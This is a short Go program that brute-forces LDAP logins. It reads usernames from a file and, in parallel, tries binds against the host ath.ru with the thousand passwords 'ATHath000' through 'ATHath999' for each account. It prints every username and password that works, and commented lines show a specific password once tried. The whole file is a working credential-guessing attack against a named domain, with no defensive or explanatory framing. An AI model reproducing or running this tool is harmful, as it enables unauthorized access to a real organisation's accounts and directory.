package main

import (
	"bufio"
	"fmt"
	"os"
	"sync"

	ldap "gopkg.in/ldap.v2"
)

func main() {

	fileHandle, _ := os.Open("file_name.txt")
	defer fileHandle.Close()
	fileScanner := bufio.NewScanner(fileHandle)
	var wg sync.WaitGroup
	for fileScanner.Scan() {
		login := fileScanner.Text()
		wg.Add(1)
		go Check(login, &wg)
	}
	wg.Wait()

	//err = l.Bind(logpass[0]+"@ATH.RU", logpass[1])
	//if err != nil {
	//	fmt.Println(err)
	//}
}

func Check(login string, wg *sync.WaitGroup) {
	//fmt.Println(login)
	defer wg.Done()
	l, err := ldap.Dial("tcp", fmt.Sprintf("%s:%d", "ath.ru", 389))
	if err != nil {
		fmt.Println(err)
		return
	}
	//err = l.Bind(login+"@ATH.RU", "ATHath559")
	//fmt.Printf("err: %s, \tlogin: %s\n", err, login)
	for index := 0; index < 1000; index++ {
		password := fmt.Sprintf("ATHath%03d", index)
		//fmt.Println(password)
		err = l.Bind(login+"@ATH.RU", password)
		if err == nil {
			fmt.Printf("login: %s, \tPassword: %s\n", login, password)
			return
		}
	}
	fmt.Printf("login: %s, \tPassword: %s\n", login, "Not found")
}
